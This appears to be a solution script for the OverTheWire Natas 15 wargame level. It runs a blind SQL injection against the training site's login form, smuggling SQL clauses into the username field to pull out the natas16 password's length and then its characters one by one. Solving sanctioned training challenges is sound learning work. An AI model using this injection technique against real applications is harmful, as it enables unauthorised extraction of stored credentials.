# OverTheWire - Natas Level 15 -> Level 16
# Code to get the password for level 16
# Run: python3 overthewire_natas15.py $Authorization_header_value

import requests
import sys

sess = requests.Session()

url="http://natas15.natas.labs.overthewire.org/index.php"

headers = {"Authorization" : sys.argv[1]}

# Find the length of the password attribute of user natas16
attribute_len = 1;
while True:
    data = {"username": "natas16\" and char_length(password) = {}-- ".format(attribute_len)}
    resp = sess.post(url, data=data, params={"debug":"true"}, headers=headers)
    #print(resp.text)
    if "This user exists." in resp.text:
        break
    attribute_len += 1

print("Password attribute length", attribute_len)

# Find the characters in the password of user natas16
characters=[]
for i in range(128):
    data = {"username": "natas16\" and password like BINARY '%{}%'-- ".format(chr(i))} # BINARY keyword for case sensitive matching
    resp = sess.post(url, data=data, params={"debug":"true"}, headers=headers)
    #print(resp.text)
    if "This user exists." in resp.text:
        characters.append(i)

characters = [chr(i) for i in characters]

print("Characters in the password", characters)

# Find the password for user natas16
password = "" 
for i in range(1, attribute_len+1, 1): # substr(password, 0, 1) returns empty string
    #print(f"Checking pos {i}")
    for c in characters:
        data = {"username": "natas16\" and substr(password, {}, 1) = BINARY \"{}\"-- ".format(i, c)}
        resp = sess.post(url, data=data, params={"debug":"true"}, headers=headers)
        #print(resp.text)
        if "This user exists." in resp.text:
            #print(f"Found char {c} at pos {i}")
            password += c 
            continue

print("The password is", password)
